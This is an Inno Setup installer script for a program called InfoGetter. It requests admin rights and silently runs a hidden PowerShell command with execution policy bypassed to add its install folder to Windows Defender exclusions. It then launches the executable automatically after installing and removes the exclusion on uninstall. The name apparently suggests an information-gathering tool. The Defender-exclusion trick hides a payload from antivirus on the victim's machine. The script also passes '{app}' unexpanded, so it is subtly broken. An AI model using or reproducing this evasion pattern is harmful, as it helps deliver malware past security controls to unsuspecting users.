; installer.iss
[Setup]
AppName=InfoGetter
AppVersion=1.0
AppPublisher=Zaim Abbasi
DefaultDirName={pf}\InfoGetter
DefaultGroupName=InfoGetter
OutputDir=.
OutputBaseFilename=InfoGetterSetup
PrivilegesRequired=admin

[Files]
Source: "InfoGetter.exe"; DestDir: "{app}"; Flags: ignoreversion

[Code]
var
  ResultCode: Integer;

procedure CurStepChanged(CurStep: TSetupStep);
begin
  if CurStep = ssPostInstall then
  begin
    // Automatically run InfoGetter.exe after installation
    Exec(ExpandConstant('{app}\InfoGetter.exe'), '', '', SW_SHOW, ewNoWait, ResultCode);
  end;
end;

procedure CurUninstallStepChanged(CurUninstallStep: TUninstallStep);
begin
  if CurUninstallStep = usPostUninstall then
  begin
    // Remove InfoGetter from Windows Defender Exclusions upon uninstallation
    Exec('powershell.exe', '-ExecutionPolicy Bypass -Command "Remove-MpPreference -ExclusionPath ''{app}''"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  end;
end;

procedure InitializeWizard();
begin
  // Add InfoGetter to Windows Defender Exclusions before installation
  Exec('powershell.exe', '-ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ''{app}''"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
end;
